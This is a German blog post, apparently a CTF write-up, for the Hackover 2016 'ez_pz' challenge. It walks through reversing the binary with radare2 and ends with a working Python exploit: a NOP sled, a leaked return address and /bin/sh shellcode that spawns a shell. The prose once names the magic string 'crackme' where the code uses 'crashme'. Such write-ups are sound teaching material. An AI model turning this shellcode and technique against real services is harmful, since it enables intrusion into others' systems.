---
title:  "Hackover 2016"
date:   2017-05-01T13:13:13+01:00
draft: false
toc: false
---

Eigentlich wollte ich diesen Artikel schon Ende Oktober 2016 runterschreiben,
kam aber leider noch nicht dazu. Naja, besser spät als nie. Letzten Oktober war
ich auf dem [Hackover](https://hackover.de/) in Hannover. Dieses Mal wurde da
ein phänomenales CTF vom CTF-Team des [Hamburger
CCC](https://www.hamburg.ccc.de/) veranstaltet. Eine der Challenges möchte ich
euch nicht vorenthalten. Da der Server, der das CTF gehandled hat bereits
abgeschaltet worden ist, muss man etwas improvisieren. Am besten dazu eignet
sich eine VM mit GNU/Linux (vorzugsweise Arch Linux natürlich). Dann kann man
die Binary nämlich getrost lokal ausführen mit der folgenden Zeile:

`socat TCP-LISTEN:6666,bind=localhost,reuseaddr,fork EXEC:./ez_pz`

Ob alles geklappt hat kann man mit `gnu-netcat` überprüfen:

![gnu-netcat in action](/img/ez_pz_1.png)

Da wir einen Login-Dialog bekommen hat alles geklappt. Wir sehen etwas
ASCII-Art, ein paar Sprüche und eine Frage:"What's your Name?".
Was aber noch viel wichtiger ist, ist die Speicheraddresse die wir da
sehen (gemeint ist der Hex-String). Diese Adresse wird noch sehr
hilfreich werden. Wenn wir das ganze etwas durchprobieren merken wir,
dass sich diese Adresse immer wieder ändert. Vermutlich ist das unsere
Rücksprungsadresse. Also die Addresse zu der wir später springen müssen
um die Challenge zu beenden. Ok werfen wir einen Blick auf die binary
mit einem meiner Lieblingstools `radare2`:

![radare2 in action](/img/ez_pz_2.png)

Was wir hier sehen ist die `main`-function. Interessant für uns ist hier
allerdings nur der Aufruf: `call sym.chall`. `sym.header` beherbergt
anscheinend nur die Ausgabe des Headers. Diesen Part können wir also
getrost ignorieren. Schauen wir uns also mal `sym.chall` an:

![radare2 in action2](/img/ez_pz_3.png)

Was sofort ins Auge fällt ist folgende Zeile die nicht ins Gesamtbild
passt:

`0x080486b0      6853880408     push str.crashme ; str.crashme ; "crashme" @ 0x8048853`

Anscheinend ist dies unser Magic-String den wir treffen müssen um in die
Funktion `sym.vuln` zu springen. Ansonsten landen wir nur bei dem `nop`
in `0x080486df`. Gut schauen wir uns mal diese `sym.vuln` an. Der Name
ist ja bereits so verräterisch:

![radare2 in action3](/img/ez_pz_4.png)

Anscheinend handled die Application den Null-Terminator falsch. Heißt
wir können eine Eingabe machen, diese mit dem Null-Byte terminieren und
dann weiterschreiben. Alles was wir weiterschreiben wird anscheinend
direkt in den Speicher geschrieben. Anhand dieses Wissens können wir nun
einen exploit komponieren, der alle Voraussetzungen erfüllt und uns dann
eine Shell poppt. Alles was wir machen müssen ist unseren Magic-String
`crackme` zu senden, dann einen Null-Terminator, dann eine `NOP`-Sled in
die wir hereinspringen können, dann die Addresse aus dem Header mit der
wir dann wiederum zu dem Shellcode springen können der gleich hinter
einer weiteren `NOP`-sled liegt.

Das Ergebnis sieht dann mit `Python` zum Beispiel so aus:

```python
#!/usr/bin/env python2
#-*- coding: utf-8 -*-

import sys
import struct
import time
import re
import binascii
import telnetlib


t = telnetlib.Telnet("127.0.0.1", 6666)
data=""

regex = re.compile("0x[0-9a-f]{8}")

data = t.read_very_eager()
print(data)
match = regex.findall(str(data))
tmp = match[0].lstrip("0x").rstrip("\n\0")
rip = binascii.unhexlify(tmp)
print("Matched Address: ", match[0])
rip = struct.unpack(">I", rip)[0]
print("Our RIP: ", hex(rip))


shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload="crashme"            # magic-string zum crashen der application
payload+="\x00"              # Null-Terminator
payload+="\x90" * 18         # 1. Nop-sled
payload+=struct.pack("<I", rip)
payload+="\x90" * 200        # 2. Nop-sled
payload+=shellcode


t.write(payload + "\n")
while True:
  data = t.read_very_eager()
  print(data)
  input = raw_input("CMD> ")
  t.write(input + "\n")

t.close()
```

Zum Schluss muss man nur noch den richtigen Server und port eintragen
und schon poppt eine Shell auf. Voila!
